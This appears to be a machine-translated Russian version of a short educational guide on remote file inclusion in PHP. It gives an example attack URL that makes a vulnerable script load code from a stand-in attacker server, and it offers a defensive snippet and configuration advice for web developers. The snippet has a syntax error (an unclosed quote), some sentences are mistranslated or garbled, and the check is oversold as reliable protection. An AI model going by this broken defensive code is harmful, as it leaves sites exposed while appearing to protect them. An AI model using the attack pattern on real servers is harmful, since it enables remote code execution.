---
title: Remote File Inclusion
localeTitle: Включение удаленного файла
---
## Включение удаленного файла

Уязвимость в приложении, вызванная программистом, требующая ввода файла, предоставленного пользователем, и не дезинфекция ввода перед доступом к запрашиваемому файлу. Это приводит к тому, что файл удаляется с удаленного сервера и включается там, где он не должен быть.

### Примеры удаленных попыток включения файлов

Веб-сайт позволяет просматривать PDF-файлы как `download.php?file=myfile.php` , из-за отсутствия надлежащей проверки злоумышленник может запросить удаленный ресурс и включить его в скрипт. URL-адрес может стать `download.php?file=http://myevilserver.gtld/evilcode.php` затем может быть `download.php?file=http://myevilserver.gtld/evilcode.php` пользователю или в тяжелых случаях запускает фактический PHP-код на вашем сервере.

### Защита вашего сайта от удаленных атак на включение файлов в PHP

Следующий PHP-код обеспечит надежную защиту от удаленных попыток включения файлов

```PHP
<?php 
 if(basename($_GET['file]) !== $_GET['file']) { 
  die('INVALID FILE REQUESTED'); 
 } 
```

*   Вы можете отключить `allow_url_fopen` в вашем файле php.ini в качестве дополнительной защиты от включения удаленного файла.

#### Дополнительная информация:

*   [OWASP Wiki - Тестирование для включения удаленного файла](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)